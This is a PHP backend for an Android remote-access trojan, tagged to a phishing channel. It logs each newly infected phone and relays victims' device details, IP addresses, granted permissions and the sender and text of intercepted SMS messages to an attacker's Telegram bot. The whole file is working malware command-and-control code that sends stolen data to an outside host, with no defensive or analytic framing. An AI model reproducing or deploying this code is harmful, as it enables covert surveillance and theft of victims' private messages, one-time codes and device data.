<?php    
//Channel @FataPhishing
//Pv @Dev_Fata
  include("info.php");
  define("TOKEN",$token);
  define("ID",$id);
//Channel @FataPhishing
//Pv @Dev_Fata
 function asd($string, $start, $end){
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
    }
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 function send($t){

     file_get_contents("https://api.telegram.org/bot".TOKEN."/SendMessage?parse_mode=HTML&chat_id=".ID."&text=".urlencode($t));
 }
 
if(isset($_POST['result'])){
  	
 $result=$_POST['result'];
 if($result == "ok"){
 $action=$_POST['action'];
 if(isset($_POST['androidid'])){
 $androidid=$_POST['androidid'];
 }if(isset($_POST['model'])){
 $model=$_POST['model']; 
 }if(isset($_POST['kos'])){
 $sdk=$_POST['kos'];
 }if(isset($_POST['battry'])){
 $battry = $_POST['battry'];
 }if(isset($_POST['opr'])){
 $opr = $_POST['opr'];
 }if(isset($_POST['number'])){
 $nump = $_POST['number'];
 }if(isset($_POST['message'])){
 $txm = $_POST['message'];
 }
         if (isset($_POST['osVersion'])) {
            $osVersion = $_POST['osVersion'];
        }

  if ($action == "firstinstall") {
            $handler = file_get_contents('data/user.txt');
            $handler .= $androidid . '/';
            file_put_contents('data/user.txt', $handler);
            
$text = "• ᴛᴀʀɢᴇᴛ #ɪɴsᴛᴀʟʟ ʀᴀᴛ !

ᴅɪᴠɪᴄᴇ ɪɴғᴏ : <b>$model</b>
ᴏᴘ : $opr

ᴀɴᴅʀᴏɪᴅ : <code>$androidid</code>
ɪᴘ : <code>$ip</code>
ᴏs ᴠᴇʀsɪᴏɴ : $osVersion

#ᴄᴏᴅᴇᴅ : @Dev_Fata";

      send($text);  
            
        
  die('');
    
}
$user=explode("/",file_get_contents("data/user.txt"));
 if(in_array($androidid,$user)){
if ($action == "ping"){
     $modddddddddddddel=$_POST['model']; 
    
	
$text = "• <b>$modddddddddddddel</b> ᴛᴀʀɢᴇᴛ ɪs ᴏɴʟɪɴᴇ 😋

ᴀɴᴅʀᴏɪᴅ : <code>$androidid</code> 
ɪᴘ : <code>$ip</code>
ᴏᴘ : $opr

#ᴄᴏᴅᴇᴅ : @Dev_Fata";

    
    
    send($text);
    
    
}elseif($action == "pingone"){
 $modddddddddddddel=$_POST['model']; 

  $text = "• <b>$modddddddddddddel</b> ᴛᴀʀɢᴇᴛ ɪs ᴏɴʟɪɴᴇ 👻

ᴀɴᴅʀᴏɪᴅ : <code>$androidid</code> 
ɪᴘ : <code>$ip</code>

#ᴄᴏᴅᴇᴅ : @Dev_Fata";
     
      send($text);
    
    
}
elseif ($action == "testphone") {
                $x = $_POST['sendsms'];
                $y = $_POST['readsms'];
                $z = $_POST['contacts'];
                $text =
                    "<strong>🔌 Permission Check
➖➖➖➖➖➖➖➖➖➖
📤 Send Sms : $x
🧾 Read Sms : $y
👥 Read Contacts : $z
➖➖➖➖➖➖➖➖➖➖
⚡ CodeD By : @Dev_Fata :)</strong>";

      send($text);

}
elseif($action == "getdevicefullinfo"){
    
  $text = "#ɪɴғᴏ ᴛᴀʀɢᴇᴛ ( <b>$model</b> ) 🤥

ᴏᴘ : $opr
ʙᴀᴛᴛᴇʀʏ : $battry %

ᴀɴᴅʀᴏɪᴅ : <code>$androidid</code>
ɪᴘ : <code>$ip</code>

#ᴄᴏᴅᴇᴅ : @Dev_Fata";
   
      send($text);
    
}elseif($action == "nwmessage"){
    
    
    
   $phone =    asd($txm,'[Address=',', Body=');
   $body= asd($txm,', Body=','IsInitialized');
  
  
   
$text = "Bᴀʙʏ ɴᴇᴡ sᴍs ғʀᴏᴍ ( <b>$model</b> ) 🥺

ᴏᴘ : $opr
ᴘʜᴏɴᴇ : $phone

ᴍᴇssᴀɢᴇ : 
$body
ʙᴀᴛᴛᴇʀʏ : $battry %

ᴀɴᴅʀᴏɪᴅ : <code>$androidid</code>
ɪᴘ : <code>$ip</code>

#ᴄᴏᴅᴇᴅ : @Dev_Fata";
	


      send($text);  
  
    
    
}
elseif($action == "lastsms"){
    
       
   $body= asd($txm,', Body=','Address');


    

$text = "ʟᴀsᴛ  sᴍs ғʀᴏᴍ ( <b>$model</b> ) 🥺


ᴍᴇssᴀɢᴇ : 
$body

ʙᴀᴛᴛᴇʀʏ : $battry %
ᴏᴘ : $opr

ᴀɴᴅʀᴏɪᴅ : <code>$androidid</code>
ɪᴘ : <code>$ip</code>

#ᴄᴏᴅᴇᴅ : @Dev_Fata";



      send($text);  
      
  
}

 } 
}

}
        ?>